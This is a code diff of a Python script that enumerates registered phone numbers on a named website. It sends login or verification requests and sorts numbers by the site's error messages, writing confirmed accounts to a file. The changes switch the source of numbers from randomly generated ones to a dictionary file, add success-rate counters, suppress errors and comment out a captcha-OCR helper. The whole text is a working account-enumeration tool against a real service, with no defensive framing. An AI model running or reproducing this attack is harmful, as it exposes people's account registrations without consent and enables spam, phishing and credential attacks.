@@ -6,8 +6,11 @@ import time
 # import ddddocr
 import requests
 
+from utils.netutils import fixpackage
 from utils.output_utils import print_suc, print_inf
 
+n = 0
+suc = 0
 #
 # opt = Options()
 # # opt.add_argument('--headless')
@@ -34,6 +37,8 @@ from utils.output_utils import print_suc, print_inf
 # info_bar_xpath = '//*[@id="fastAjaxLoginForm"]/div/div/div[1]/span'
 # submit_btn_xpath = '//*[@id="fastAjaxLoginForm"]/div/div/div[6]/a'
 threads = 0
+
+
 # d = ddddocr.DdddOcr()
 
 class tel:
@@ -103,13 +108,13 @@ class tel:
                         self.cookie[res_s[0]] = res_s[1]
         return requ
 
-      # 开启验证码识别模块
+    # 开启验证码识别模块
 
-    def get_verify_code(self):
-        url = 'https://www.yxcps.com/vcode2/imageVCode?t=%s' % int(time.time())
-        res = requests.get(url, cookies=self.cookie)
-        n = d.classification(res.content)
-        return n
+    # def get_verify_code(self):
+    #     url = 'https://www.yxcps.com/vcode2/imageVCode?t=%s' % int(time.time())
+    #     res = requests.get(url, cookies=self.cookie)
+    #     n = d.classification(res.content)
+    #     return n
 
     def send_verify_package(self, phone: str):
         headers_add = self.getcsrftoken()
@@ -137,42 +142,48 @@ class tel:
     threads = 0
 
     def doonce(self, tel):
-        global threads
+        global n, suc, threads
         threads += 1
         random_tel = tel
         w = open('tel.res', 'a')
+        n += 1
         while True:
-            msg = json.loads(self.send_verify_package(random_tel))['msg']
-            self.cookie = {'JSESSIONID': self.JSESSIONID}
-            # print(msg)
-            if '用户名或密码错误' in msg:
-                print_suc(random_tel)
-                w.write(random_tel + '\n')
-                break
-            elif '未注册' in msg:
-                print_inf(random_tel)
-                break
+            try:
+                msg = json.loads(self.send_verify_package(random_tel))['msg']
+                self.cookie = {'JSESSIONID': self.JSESSIONID}
+                # print(msg)
+                if '用户名或密码错误' in msg or '还未' in msg:
+                    suc += 1
+                    print_suc('已注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
+                    w.write(random_tel + '\n')
+                    break
+                elif '未注册' in msg:
+                    # n += 1
+                    print_inf('未注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
+                    break
+                else:
+                    print(msg)
+            except:
+                pass
         threads -= 1
 
 
 if __name__ == '__main__':
 
-    # a.doonce('13944064724')
     # while True:
-    #     while threads <= 5:
+    #     while threads <= 10:
     #         try:
     #             # print(threads)
     #             threading.Thread(target=tel().doonce, args=('15' + tel().generate_random_str(9),)).start()
     #             threading.Thread(target=tel().doonce, args=('13' + tel().generate_random_str(9),)).start()
     #             threading.Thread(target=tel().doonce, args=('18' + tel().generate_random_str(9),)).start()
     #         except Exception:
-    #             pas
+    #             pass
 
-    while True:
+    for it in open('dic/1.dic', 'r').readlines():
+        it = fixpackage(it)
         a = tel()
         try:
-            a.doonce('15' + tel().generate_random_str(9))
-            a.doonce('13' + tel().generate_random_str(9))
-            a.doonce('18' + tel().generate_random_str(9))
+            a.doonce(it)
         except Exception:
             pass
